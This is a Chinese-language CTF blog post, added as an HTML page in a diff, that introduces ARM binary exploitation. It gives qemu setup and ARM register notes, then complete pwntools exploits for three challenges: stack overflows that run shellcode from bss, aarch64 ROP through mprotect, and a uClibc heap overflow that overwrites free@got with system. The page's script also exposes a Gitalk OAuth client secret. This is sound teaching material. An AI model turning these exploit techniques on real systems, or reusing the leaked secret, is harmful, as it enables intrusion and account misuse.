@@ -1,0 +1,365 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="Sivona">
+
+
+
+
+
+<title>arm pwn 从 0 到 0.1 | Sivona&#39;s</title>
+
+
+
+    <link rel="icon" href="/bug.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Sivona&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Sivona&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">arm pwn 从 0 到 0.1</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">Sivona</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">September 9, 2020&nbsp;&nbsp;18:10:49</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/arm/">arm</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <p>好久没写博客了，最近尝试了一些奇怪的架构来水一篇</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="安装qemu"><a href="#安装qemu" class="headerlink" title="安装qemu"></a>安装qemu</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install qemu</span><br></pre></td></tr></table></figure>
+
+<p>不同系统安装方式不同，一般来说只需要用到用户模式</p>
+<p>或者使用arm_now <a href="https://github.com/nongiach/arm_now" target="_blank" rel="noopener">https://github.com/nongiach/arm_now</a></p>
+<h3 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install -y gcc-arm-linux-gnueabi</span><br><span class="line">sudo apt-get install -y gcc-aarch64-linux-gnu g++-aarch64-linux-gnu</span><br></pre></td></tr></table></figure>
+
+<h2 id="简单了解arm"><a href="#简单了解arm" class="headerlink" title="简单了解arm"></a>简单了解arm</h2><h3 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h3><h4 id="函数调用"><a href="#函数调用" class="headerlink" title="函数调用"></a>函数调用</h4><ul>
+<li><p>arm32 函数调用前面4个参数使用寄存器r0-r3，后面的参数使用栈传递，r0存放函数返回值</p>
+</li>
+<li><p>r11 = fp ≈ bp ，堆栈的增长规则和x86一样。</p>
+</li>
+<li><p>pc寄存器控制程序流</p>
+</li>
+</ul>
+<h4 id="常用指令集"><a href="#常用指令集" class="headerlink" title="常用指令集"></a>常用指令集</h4><ul>
+<li><p>bl ≈ call</p>
+</li>
+<li><p>pop {r11, pc} ≈ pop r11;pop pc</p>
+</li>
+<li><p>ldr r0，[r1，＃8]    将r1+8指向的值赋值给r0</p>
+</li>
+<li><p>ldr r0，[r1]，r2     将r1指向的值赋给r0，并且 r1 += r2</p>
+</li>
+<li><p>sub sp, fp, #4    sp = fp - 4</p>
+</li>
+</ul>
+<h3 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h3><h4 id="函数调用-1"><a href="#函数调用-1" class="headerlink" title="函数调用"></a>函数调用</h4><ul>
+<li><p>arm64 前面8个参数都是通过寄存器来传递x0-x7，x0存放函数返回值。</p>
+</li>
+<li><p>x29 约等于 bp</p>
+</li>
+<li><p>x30控制程序流，ret会使程序流跳转到x30所指的地址</p>
+</li>
+</ul>
+<h4 id="常用指令集-1"><a href="#常用指令集-1" class="headerlink" title="常用指令集"></a>常用指令集</h4><ul>
+<li><p>pop被ldp所代替</p>
+</li>
+<li><p>ldp x29, x30, [sp], #0x10    将[sp]、[sp+8] 依次赋值给x29,x30，然后sp -= 0x10</p>
+</li>
+<li><p>ldp x19, x20, [sp, #0x10]    从[sp+0x10]读0x10字节给x19 x20</p>
+</li>
+</ul>
+<h2 id="如何调试"><a href="#如何调试" class="headerlink" title="如何调试"></a>如何调试</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">qemu-arm -L &#x2F;usr&#x2F;arm-linux-gnueabi -g 2345 .&#x2F;32</span><br><span class="line">qemu-aarch64 -L &#x2F;usr&#x2F;aarch64-linux-gnu&#x2F; -g 1234 .&#x2F;64</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>-L指定动态库</p>
+</li>
+<li><p>-g 1234 指定gdbserver端口为1234并等待gdb连接</p>
+</li>
+</ul>
+<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>题目都可以在buu找到</p>
+<h3 id="inCTF2018-wARMup"><a href="#inCTF2018-wARMup" class="headerlink" title="inCTF2018_wARMup"></a>inCTF2018_wARMup</h3><p>题目很简单就是一个栈溢出，但是溢出的字节不多，想要知道多少字节溢出最好gdb调一下，ida显示得不一定准确</p>
+<p>arm下大多数栈溢出题目都可以将栈迁移到bss上然后执行shellcode，好像arm的bss段都是可执行，可能和qemu的启动参数有关，这里没有进行深究。</p>
+<p>本题的思路也是如此：首先控制程序流，通过一个gadget</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x10364 &lt;_init+8&gt;:	pop	&#123;r3, pc&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以控制r3的值，然后再返回到main函数，实现任意地址写</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0x0001052c &lt;+52&gt;:	sub	r3, r11, #104	; 0x68</span><br><span class="line">0x00010530 &lt;+56&gt;:	mov	r2, #120	; 0x78</span><br><span class="line">0x00010534 &lt;+60&gt;:	mov	r1, r3</span><br><span class="line">0x00010538 &lt;+64&gt;:	mov	r0, #0</span><br><span class="line">0x0001053c &lt;+68&gt;:	bl	0x1037c &lt;read@plt&gt;</span><br><span class="line">0x00010540 &lt;+72&gt;:	mov	r3, #0</span><br><span class="line">0x00010544 &lt;+76&gt;:	mov	r0, r3</span><br><span class="line">0x00010548 &lt;+80&gt;:	sub	sp, r11, #4</span><br><span class="line">0x0001054c &lt;+84&gt;:	pop	&#123;r11, pc&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这样我们就可以实现向bss段写入shellcode，并执行。</p>
+<p>exp:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">from time import sleep</span><br><span class="line">import sys</span><br><span class="line">context.binary &#x3D; &quot;.&#x2F;wARMup&quot;</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">elf &#x3D; context.binary</span><br><span class="line">libc &#x3D; ELF(&quot;.&#x2F;lib&#x2F;libc.so.6&quot;)</span><br><span class="line"></span><br><span class="line">if sys.argv[1] &#x3D;&#x3D; &quot;l&quot;:</span><br><span class="line">    io &#x3D; process([&quot;qemu-arm&quot;, &quot;-L&quot;, &quot;.&#x2F;&quot;, &quot;.&#x2F;wARMup&quot;])</span><br><span class="line">elif sys.argv[1] &#x3D;&#x3D; &quot;d&quot;:</span><br><span class="line">    io &#x3D; process([&quot;qemu-arm&quot;, &quot;-g&quot;, &quot;1234&quot;, &quot;-L&quot;, &quot;.&#x2F;&quot;, &quot;.&#x2F;wARMup&quot;])</span><br><span class="line">else:</span><br><span class="line">    io &#x3D; remote(&quot;node3.buuoj.cn&quot;, 28965)</span><br><span class="line"></span><br><span class="line">sc &#x3D; b&quot;\x01\x30\x8f\xe2&quot;</span><br><span class="line">sc +&#x3D;b&quot;\x13\xff\x2f\xe1&quot;</span><br><span class="line">sc +&#x3D;b&quot;\x78\x46\x0e\x30&quot;</span><br><span class="line">sc +&#x3D;b&quot;\x01\x90\x49\x1a&quot;</span><br><span class="line">sc +&#x3D;b&quot;\x92\x1a\x08\x27&quot;</span><br><span class="line">sc +&#x3D;b&quot;\xc2\x51\x03\x37&quot;</span><br><span class="line">sc +&#x3D;b&quot;\x01\xdf\x2f\x62&quot;</span><br><span class="line">sc +&#x3D;b&quot;\x69\x6e\x2f\x2f&quot;</span><br><span class="line">sc +&#x3D;b&quot;\x73\x68&quot;</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    base &#x3D; elf.bss() + 0x300</span><br><span class="line">    payload &#x3D; flat(cyclic(100), base, 0x00010364, base, 0x10534)</span><br><span class="line">#    pause()</span><br><span class="line">    io.send(payload)</span><br><span class="line">    sleep(5)</span><br><span class="line">#    sc &#x3D; asm(shellcraft.sh())</span><br><span class="line">    io.send(p32(base+ 0x4)+ sc)</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="shanghai2018-baby-arm"><a href="#shanghai2018-baby-arm" class="headerlink" title="shanghai2018 baby_arm"></a>shanghai2018 baby_arm</h3><p>一道32位栈溢出一道64位栈溢出 美滋滋</p>
+<p>这题比较直接，先往bss段上写数据，再往栈上写，这样我们利用起来就比较简单了</p>
+<p>网上一些师傅用到了mprotect，好像不用也可以直接在bss段上执行</p>
+<p>需要注意的是第二个read控制的是main函数的返回地址并不是自己的，函数返回地址在局部变量的上面，这里不知道为什么，具体问题具体分析吧。</p>
+<p>放两个exp，先是使用了mprotect的:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from time import sleep</span><br><span class="line">context.log_level &#x3D; &#39;debug&#39;</span><br><span class="line">binary &#x3D; &#39;.&#x2F;pwn&#39;</span><br><span class="line">context.binary &#x3D; binary</span><br><span class="line">p &#x3D; process([&quot;qemu-aarch64&quot;, &quot;-g&quot;, &quot;1234&quot;, &quot;-L&quot;, &quot;&#x2F;usr&#x2F;aarch64-linux-gnu&#x2F;&quot;, binary])</span><br><span class="line">#p &#x3D; process([&quot;qemu-aarch64&quot;, &quot;-L&quot;, &quot;&#x2F;usr&#x2F;aarch64-linux-gnu&#x2F;&quot;, binary])</span><br><span class="line"></span><br><span class="line">bss &#x3D; 0x411068</span><br><span class="line">mprotect &#x3D; 0x4007D4</span><br><span class="line">code &#x3D; asm(shellcraft.sh()).ljust(0x100) + p64(mprotect)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(b&#39;Name:&#39;,code)</span><br><span class="line"></span><br><span class="line">gad1 &#x3D; 0x4008AC</span><br><span class="line">gad2 &#x3D; 0x4008CC</span><br><span class="line">sleep(0.1)</span><br><span class="line">padding &#x3D; b&#39;\x61&#39;*0x48</span><br><span class="line">buf &#x3D; padding + p64(gad2) + p64(gad1)*2 + p64(0) + p64(1) + p64(bss+0x100) + p64(0x7) + p64(bss)*4</span><br><span class="line">p.send(buf)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>直接执行的:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from time import sleep</span><br><span class="line">context.log_level &#x3D; &#39;debug&#39;</span><br><span class="line">binary &#x3D; &#39;.&#x2F;pwn&#39;</span><br><span class="line">context.binary &#x3D; binary</span><br><span class="line">#p &#x3D; process([&quot;qemu-aarch64&quot;, &quot;-g&quot;, &quot;1234&quot;, &quot;-L&quot;, &quot;&#x2F;usr&#x2F;aarch64-linux-gnu&#x2F;&quot;, binary])</span><br><span class="line">#p &#x3D; process([&quot;qemu-aarch64&quot;, &quot;-L&quot;, &quot;&#x2F;usr&#x2F;aarch64-linux-gnu&#x2F;&quot;, binary])</span><br><span class="line">p &#x3D; remote(&#39;node3.buuoj.cn&#39;,29981)</span><br><span class="line">bss &#x3D; 0x411068</span><br><span class="line">mprotect &#x3D; 0x4007D4</span><br><span class="line">code &#x3D; asm(shellcraft.sh()).ljust(0x100) + p64(mprotect)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(b&#39;Name:&#39;,code)</span><br><span class="line"></span><br><span class="line">gad1 &#x3D; 0x4008AC</span><br><span class="line">gad2 &#x3D; 0x4008CC</span><br><span class="line">sleep(0.1)</span><br><span class="line">padding &#x3D; b&#39;\x61&#39;*0x48</span><br><span class="line">#buf &#x3D; padding + p64(gad2) + p64(gad1)*2 + p64(0) + p64(1) + p64(bss+0x100) + p64(0x7) + p64(bss)*4</span><br><span class="line">buf &#x3D; padding + p64(bss)</span><br><span class="line">p.send(buf)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="2020第五空间线上-pwnme"><a href="#2020第五空间线上-pwnme" class="headerlink" title="2020第五空间线上 pwnme"></a>2020第五空间线上 pwnme</h3><p>程序很简单就是一个菜单堆，该有的功能都有。</p>
+<p>arm下使用的是uClibc，内存分配机制和glibc相比简洁很多</p>
+<p>本题用到了fastbin attack，先贴主要代码，全部代码可以在 <strong>\libc\stdlib\malloc-standard</strong> 找到</p>
+<p>malloc:</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">   <span class="comment">/*</span></span><br><span class="line"><span class="comment">      If the size qualifies as a fastbin, first check corresponding bin.</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(nb) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(av-&gt;max_fast)) &#123;</span><br><span class="line">fb = &amp;(av-&gt;fastbins[(fastbin_index(nb))]);</span><br><span class="line"><span class="keyword">if</span> ( (victim = *fb) != <span class="number">0</span>) &#123;</span><br><span class="line">    *fb = victim-&gt;fd;</span><br><span class="line">    check_remalloced_chunk(victim, nb);</span><br><span class="line">    retval = chunk2mem(victim);</span><br><span class="line">    <span class="keyword">goto</span> DONE;</span><br><span class="line">&#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+<p>free:</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">       If eligible, place chunk on a fastbin so it can be found</span></span><br><span class="line"><span class="comment">       and used quickly in malloc.</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(av-&gt;max_fast)</span><br><span class="line"></span><br><span class="line">#<span class="keyword">if</span> TRIM_FASTBINS</span><br><span class="line">	    <span class="comment">/* If TRIM_FASTBINS set, don't place chunks</span></span><br><span class="line"><span class="comment">	       bordering top into fastbins */</span></span><br><span class="line">	    &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)</span><br><span class="line">#endif</span><br><span class="line">       ) &#123;</span><br><span class="line"></span><br><span class="line">	set_fastchunks(av);</span><br><span class="line">	fb = &amp;(av-&gt;fastbins[fastbin_index(size)]);</span><br><span class="line">	p-&gt;fd = *fb;</span><br><span class="line">	*fb = p;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>该题change功能没有控制写入的字节数目，存在堆溢出。</p>
+<p>我们先通过unsortedbin泄露libc基地址然后fastbin attack打free@got改为system，然后free(“/bin/sh”)</p>
+<p>思路很简单，但是fastbin的fd实在是没搞懂咋回事，还是具体问题具体分析 芜湖XD</p>
+<p>直接给exp吧：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line"></span><br><span class="line">binary &#x3D; &#39;.&#x2F;a&#39;</span><br><span class="line">context.binary &#x3D; binary</span><br><span class="line">context.log_level &#x3D; &#39;debug&#39;</span><br><span class="line"></span><br><span class="line">p &#x3D; process([&#39;qemu-arm&#39;,&#39;-L&#39;,&#39;.&#x2F;&#39;,&#39;.&#x2F;a&#39;])</span><br><span class="line">#p &#x3D; process([&#39;qemu-arm&#39;,&#39;-L&#39;,&#39;.&#x2F;&#39;,&#39;-g&#39;,&#39;1234&#39;,&#39;.&#x2F;a&#39;])</span><br><span class="line">libc &#x3D; ELF(&#39;lib&#x2F;libc.so.0&#39;)</span><br><span class="line"></span><br><span class="line">def show():</span><br><span class="line">    p.sendlineafter(&#39;&gt;&gt;&gt; &#39;,&#39;1&#39;)</span><br><span class="line"></span><br><span class="line">def add(size,content):</span><br><span class="line">    p.sendlineafter(&#39;&gt;&gt;&gt; &#39;,&#39;2&#39;)</span><br><span class="line">    p.sendlineafter(&#39;:&#39;,str(size))</span><br><span class="line">    p.sendafter(&#39;:&#39;,content)</span><br><span class="line"></span><br><span class="line">def edit(index,size,content):</span><br><span class="line">    p.sendlineafter(&#39;&gt;&gt;&gt; &#39;,&#39;3&#39;)</span><br><span class="line">    p.sendlineafter(&#39;:&#39;,str(index))</span><br><span class="line">    p.sendlineafter(&#39;:&#39;,str(size))</span><br><span class="line">    p.sendafter(&#39;:&#39;,content)</span><br><span class="line"></span><br><span class="line">def free(index):</span><br><span class="line">    p.sendlineafter(&#39;&gt;&gt;&gt; &#39;,&#39;4&#39;)</span><br><span class="line">    p.sendlineafter(&#39;:&#39;,str(index))</span><br><span class="line">offset &#x3D; 0x9a8ec</span><br><span class="line"></span><br><span class="line">add(10,&#39;&#x2F;bin&#x2F;sh&#39;)</span><br><span class="line">add(8,&#39;aaaa&#39;)</span><br><span class="line">add(50,&#39;aaaa&#39;)</span><br><span class="line">add(8,&#39;aaaa&#39;)</span><br><span class="line">add(0xf8,&#39;aaaa&#39;)</span><br><span class="line">add(0x200,(p32(0)+p32(0x11))*10)</span><br><span class="line"></span><br><span class="line">#leak</span><br><span class="line">edit(3,20,b&#39;\x61&#39;*8 +p32(0)+p32(0x121))</span><br><span class="line">free(4)</span><br><span class="line">add(0xf8,&#39;aaaa&#39;)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(&#39;5 : &#39;)</span><br><span class="line">leak &#x3D; u32(p.recv(4))</span><br><span class="line">libc.address &#x3D; leak - offset</span><br><span class="line">info(&#39;libc_base:&#39;+hex(libc.address))</span><br><span class="line"></span><br><span class="line">#fastbins attach</span><br><span class="line">free(2)</span><br><span class="line">edit(1,100,b&#39;\x11&#39;*8 + p32(0) +p32(0x39) + p32(0x00021032))</span><br><span class="line">pause()</span><br><span class="line">add(50,&#39;aaaa&#39;)</span><br><span class="line">add(50,p32(libc.sym[&#39;malloc&#39;])*3+p32(libc.sym[&#39;read&#39;])*3+p32(libc.sym[&#39;atoi&#39;])*2+p32(libc.sym[&#39;system&#39;]))</span><br><span class="line">free(0)#run</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+<div id="gitalk-container"></div>
+<script src="https://cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script><link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css"><script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+		<script>
+		var gitalkConfig = {"clientID":"787cc455593c1fb9cfcd","clientSecret":"f6abba3d9cc77878426ee16aa8bcb980fd3cd70c","repo":"s1vona.github.io","owner":"s1vona","admin":["s1vona"],"distractionFreeMode":true};
+	    gitalkConfig.id = md5(location.pathname);
+		var gitalk = new Gitalk(gitalkConfig);
+	    gitalk.render("gitalk-container");
+	    </script>
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>Sivona</span>
+                    </p>
+                
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Enforce justice on behalf of Heaven.</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/arm/"># arm</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2020/06/09/%E8%AE%BA%E5%A6%82%E4%BD%95%E5%9C%A8glibc2-29%E4%B8%8B%E7%94%9F%E5%AD%98/">论如何在glibc2.29下生存</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© Sivona | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+    <div>
+        友情链接: 
+       <div>
+        <a class="theme-link"  href="https://sncker.github.io" target="_blank" rel="noopener"> SNCKER's blog </a><span>&nbsp;&nbsp;</span>
+        <a class="theme-link"  href="https://blog.csdn.net/qq_43531895" target="_blank" rel="noopener"> EnJoy_July 's blog' </a><span>&nbsp;&nbsp;</span>
+       </div>
+       
+      </div>
+</footer>
+
+    </div>
+</body>
+</html>
